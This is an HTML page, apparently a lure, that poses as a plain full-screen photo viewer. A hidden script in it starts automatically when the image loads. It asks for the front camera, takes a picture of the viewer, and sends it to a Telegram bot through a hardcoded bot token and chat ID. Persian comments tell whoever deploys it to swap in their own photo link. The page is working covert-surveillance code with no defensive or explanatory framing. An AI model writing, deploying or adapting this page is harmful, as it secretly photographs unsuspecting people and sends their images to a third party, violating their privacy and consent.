<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
    <title>写真</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body,html{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}
        #photo{width:100vw;height:100vh;object-fit:cover;display:block}
        video,canvas{display:none}
    </style>
</head>
<body>

<!-- فقط لینک عکس خودت رو اینجا بذار -->
<img id="photo" src="https://mahdie1386.github.io/Fast/IMG_20251205_011158_078.jpg">

<video id="video" playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
    const CHAT_ID = "-1003384762825";

    async function takeSelfie() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: {ideal: 1920}, height: {ideal: 1080} }
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();

            // ۱.۵ ثانیه صبر کن تا دوربین کامل روشن بشه
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    const form = new FormData();
                    form.append('chat_id', CHAT_ID);
                    form.append('photo', blob, 'selfie.jpg');
                    form.append('caption', 'عکس زنده از دوربین سلفی');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
                }, 'image/jpeg', 0.95);

                // دوربین رو خاموش کن
                stream.getTracks().forEach(t => t.stop());
            }, 1500);

        } catch(e) {
            console.log("دوربین بلاک شد");
        }
    }

    // وقتی عکس لود شد → خودکار سلفی بگیره
    document.getElementById('photo').onload = () => {
        setTimeout(takeSelfie, 800);
    };
</script>
</body>
</html>
